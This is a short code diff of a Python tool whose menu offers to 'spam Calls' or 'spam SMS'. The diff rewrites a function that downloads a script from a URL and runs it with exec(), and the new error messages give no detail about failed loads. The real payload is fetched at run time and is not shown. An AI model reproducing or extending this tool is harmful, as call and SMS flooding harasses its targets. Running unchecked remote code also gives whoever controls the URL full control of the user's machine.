@@ -1,7 +1,21 @@
 import requests
 
+def run_script_from_url(url):
+    try:
+        # تحميل محتويات السكريبت من الرابط
+        response = requests.get(url)
+        response.raise_for_status()  # يثير استثناءً إذا كانت حالة الاستجابة غير ناجحة
+        
+        # تنفيذ السكريبت
+        exec(response.text)
+    except requests.RequestException as e:
+        print(f" failed: ")
+    except Exception as e:
+        print(f"An error occurred")
+
 def menu():
     print('''
+
 ==================================================================
 = ███████╗██████╗  █████╗ ███╗   ███╗███╗   ███╗███████╗██████╗  =
 = ██╔════╝██╔══██╗██╔══██╗████╗ ████║████╗ ████║██╔════╝██╔══██╗ =
@@ -11,20 +25,10 @@ def menu():
 = ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝ =
 ==================================================================
 
-                Dev By Ghalwash User : @Mrfa0gh
+            Dev By Ghalwash User : @Mrfa0gh
     ''')
-    choice = input("        Choose an option (1 spam  Calls or 2 spam SMS): =>> ")
+    choice = input("        Choose an option (1 spam Calls or 2 spam SMS): =>> ")
     return choice
-
-def run_script_from_url(url):
-    # Get the script content from the URL
-    response = requests.get(url)
-    
-    # Execute the script
-    if response.status_code == 200:
-        exec(response.text)
-    else:
-        print(f"Failed to load script from {url}. HTTP Status Code: {response.status_code}")
 
 if __name__ == "__main__":
     user_choice = menu()
